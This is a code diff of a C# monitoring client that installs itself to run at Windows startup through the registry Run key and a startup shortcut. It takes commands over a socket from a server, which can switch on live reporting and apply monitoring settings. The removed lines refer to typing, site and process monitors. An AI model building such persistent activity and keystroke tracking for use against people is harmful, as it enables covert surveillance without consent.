@@ -21,22 +21,25 @@ namespace ClientSide
     public delegate void updateProccess(string proccess);
     class Program
     {
+
+        const string ID = "id";
+        const string SETTING = "setting";
+        const string LIVE = "get current state";
+        const string STOP_LIVE = "stop current state";
+        const string REMOVE_CLIENT = "remove client";
         private String id;
         private Socket clientSocket;
         private String name;
         private String ip;
         private Byte[] buffer;
         private DBclient dbs;
-        private setSetting set;
+        private Setting set;
         private ClientForm clientForm;
         public Boolean sendCurrentData;      
         string keyDate;
         public static Program program;
         
-        public MonitorProccess monitorProccess;
-        public MonitorTyping monitorTyping;
-        public MonitorSite monitorSite;
-        public MonitorInstallations monitorInstallations;
+      
 
         /// <summary>
         /// The main entry point for the application.
@@ -44,27 +47,31 @@ namespace ClientSide
         [STAThread]
         static void Main()
         {
-            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            // sqliteForm sf = new sqliteForm();
+            // sf.ShowDialog();
 
-             connectAtReStartComputer();
+            // Set up the software that will work when you turn on the computer           
+            connectAtReStartComputer();
 
             program = new Program();
-            //Application.EnableVisualStyles();
-            //Application.SetCompatibleTextRenderingDefault(false);
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
 
-            // The path to the key where Windows looks for startup applications
-
+          
             // check if connect at first time or reconnect         
             if (!program.initialClient())
             {
                 program.connectToServer();
             }
-
+            
             Application.Run();
         }
 
         private static void connectAtReStartComputer()
         {
+            // The path to the key where Windows looks for startup applications
+            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            
             string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
             WshShell shell = new WshShell();
             string shortcutAddress = startupFolder + @"\MyStartupShortcut.lnk";
@@ -98,50 +105,52 @@ namespace ClientSide
                     return;
                 }
 
-                string data = Encoding.ASCII.GetString(buffer);
-                //("server send: |" + data + "|");
+                string data = Encoding.ASCII.GetString(buffer);            
 
                 var dataFromServer = data.Split(new[] { '\r', '\n', '\0' }, 2);
+                ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
+                
+                // dataFromServer[0] contain request subject from server side
+                // in switch the request sent to handler function
+                switch (dataFromServer[0])
+                {
+                    // Get uniqe id 
+                    case ID:
+                        id = dataFromServer[1].Split('\r', '\n', '\0')[0];
+                        break;
 
-                if (dataFromServer[0] == "id")
-                {
-                    id = dataFromServer[1].Split('\r', '\n', '\0')[0];
-                }
-                if (dataFromServer[0] == "setting")
-                {
-                    string setting = dataFromServer[1].Split('\0')[0];
-                    setting = setting.Substring(setting.IndexOf("\n") + 1);
-                    playAllTrigers(setting); //This method obtains the settings string from the server
+                    // Get Setting to implement monitoring
+                    case SETTING: 
+                        string setting = dataFromServer[1].Split('\0')[0];
+                        setting = setting.Substring(setting.IndexOf("\n") + 1);
+                        playAllTrigers(setting); //This method obtains the settings string from the server
+                        break;
 
-                }
-                if (dataFromServer[0] == "get current state")
-                {
-                    ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
-                    sendCurrentData = true;
-                    sendCurrentState(clientSocket);
-                }
-                if (dataFromServer[0] == "stop current state")
-                {
-                    ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
-                   
-                    stopSendCurrentState(clientSocket);
-                }
-                if (dataFromServer[0] == "remove client") {
-                    removeClient();
-                }
+                    // Launch the software in live reporting mode
+                    case LIVE:
+                        liveMode(clientSocket);
+                        break;
 
+                    // Stop live reporting mode
+                    case STOP_LIVE:
+                        ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
+                        stopLiveMode(clientSocket);
+                        break;
 
-                else
-                {
-                    //ShowErrorDialog("Server send:\n" + data);
+                    // Remove computer from monitoring
+                    case REMOVE_CLIENT:
+                        removeClient();
+                        break;
+
+                    default:
+                        ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
+                        break;
                 }
-                //System.Threading.Thread.Sleep(7000);
-                //SendData("server send: \n" + data);
-                //Start receiving data again.
+                                      
                 buffer = new byte[clientSocket.ReceiveBufferSize];
                 clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);
             }
-            // Avoid Pokemon exception handling in cases like these.
+             
             catch (SocketException ex)
             {
                 ShowErrorDialog(ex.Message);
@@ -158,57 +167,66 @@ namespace ClientSide
             // db
             // restart
             // turn off all theards 
-            ShowErrorDialog("removeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee");
+            ShowErrorDialog("removeeeeeeeeeeee");
+
         }
 
 
-        private void stopSendCurrentState(Socket clientSocket)
+        private void stopLiveMode(Socket clientSocket)
         {
+
             sendCurrentData = false;
-            monitorProccess.ifLive = false;
+          //  monitorProccess.ifLive = false;
             ShowErrorDialog("stop send current state");
         }
 
-        private void sendCurrentState(Socket socket)
+        private void liveMode(Socket socket)
         {
             sendCurrentData = true;
-            // build string that contain all current process 
-            string allProc = ShowAllProcess.ListAllApplications();
-            //string keyDate = monitorTyping.input;
             SendData(socket, "current state\ropen CurrentState form");
-            // send all current procces
-            // string processes = ShowAllProcess.ListAllApplications();
-            monitorProccess = new MonitorProccess();
+           
             
         }
 
         // set setting and here will play all triggers;
         private void playAllTrigers(string setting)
         {
-            //set setting 
-            set = new setSetting(setting, name, id);
+            // save setting 
+            saveSettingFile(setting);
+           
             ShowErrorDialog("play all trigers");
             
-            // connect to DB
-            if (dbs == null)
+            // play all monitors
+            ManageMonitor manageMonitor = new ManageMonitor();
+            Report.setReportFrequency();
+        }
+
+        private void saveSettingFile(string setting)
+        {
+            string userName = Environment.UserName;
+
+
+            String projectDirectory = Environment.CurrentDirectory;
+            string filepath = Directory.GetParent(projectDirectory).Parent.FullName;
+
+
+            String[] paths = new string[] { @filepath, "files" };
+            filepath = Path.Combine(paths);
+           
+            if (!Directory.Exists(filepath))
             {
-                dbs = new DBclient(name);
+                Directory.CreateDirectory(filepath);
             }
-            dbs.connectToDatabase();
 
-            // play Monitor Site trigger
-            monitorSite = new MonitorSite(dbs, set);
-            dbs.removeIgnoredSites(set.anotherSitesIgnore.ToArray());
-            dbs.funAddCategorySiteTable(set.anotherSitesReport.ToArray(), "anotherSitesReport");
+            String settingFile = Path.Combine(filepath, "setting_" + userName + ".txt");
+            if (!System.IO.File.Exists(settingFile))
+            {
+                using (StreamWriter sw = System.IO.File.CreateText(settingFile)) ;
 
-            // play MonitorTyping trigger
-            monitorTyping = new MonitorTyping(dbs, set);          
+                System.IO.File.WriteAllText(settingFile, name + "\r\n" + id + "\r\n" + setting);
 
-            // play Monitor installations trigger
-            monitorInstallations = new MonitorInstallations(dbs, set);
+            }
 
-            // play Reporting scheduling
-            Report.setReportFrequency(set.futureDateToReport, set.reportFrequencyInSecond, set.reportFrequencyInWord, dbs);
         }
 
         // Defines functions for sending and receiving data through the socket
@@ -279,7 +297,6 @@ namespace ClientSide
                 name = clientForm.clientName;
                 ip = clientForm.ip;
 
-                dbs = new DBclient(name);
 
                 // Create new socket 
                 clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -306,51 +323,38 @@ namespace ClientSide
         private bool initialClient()
         {
 
-            String projectDirectory = Environment.CurrentDirectory;
-            string filepath = Directory.GetParent(projectDirectory).Parent.FullName;
-            String[] paths = new string[] { @filepath, "files" };
-            filepath = Path.Combine(paths);
             string set = "";
-            DirectoryInfo d = new DirectoryInfo(filepath);//Assuming Test is your Folder
+            string projectDirectory = Environment.CurrentDirectory;
+            string filepath = Directory.GetParent(projectDirectory).Parent.FullName;
+            string[] paths = new string[] { @filepath, "files" };
+            filepath = Path.Combine(paths);
+            
+            DirectoryInfo directory = new DirectoryInfo(filepath);//Assuming Test is your Folder
             //ShowErrorDialog("filepath is: \n" + filepath);
-            if (!Directory.Exists(filepath))
-            {
-                return false;
-            }
-
-            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Text files
-
-            foreach (FileInfo file in Files)
-            {
-
-                if (file.Name != null)
+            string fileName = "setting_" + Environment.UserName + ".txt";
+            if (Directory.Exists(filepath) && System.IO.File.Exists(Path.Combine(filepath, fileName)))
+            { 
+                
+                using (StreamReader sr = System.IO.File.OpenText(Path.Combine(filepath, fileName)))
                 {
-                    //ShowErrorDialog(file.Name);
-                    // Open the file to read from.
-                    using (StreamReader sr = System.IO.File.OpenText(Path.Combine(filepath, file.Name)))
+                    name = sr.ReadLine();
+                    id = sr.ReadLine();
+                    ip = "127.1.0.0";
+                    
+                    string line = "";
+                    while ((line = sr.ReadLine()) != null)
                     {
-                        name = sr.ReadLine();
-                        id = sr.ReadLine();
-                        ip = "127.1.0.0";
-                        //ShowErrorDialog("id\n" + id);
-                        string line = "";
-                        while ((line = sr.ReadLine()) != null)
-                        {
-                            //ShowErrorDialog("line\n" + line);
-                            set += line + "\r\n";
-                        }
+                        //ShowErrorDialog("line\n" + line);
+                        set += line + "\r\n";
                     }
-
-                    playAllTrigers(set);
-                    reConnect();
-                   
-
                 }
 
+                playAllTrigers(set);
+                reConnect();
+                return true;
             }
 
-            if (Files.Length >= 1)
-                return true;
+             
             return false;
 
         }
@@ -428,6 +432,7 @@ namespace ClientSide
             }
 
         }
+       
         public static void updateCurrentProcess(string proccess)
         {
             
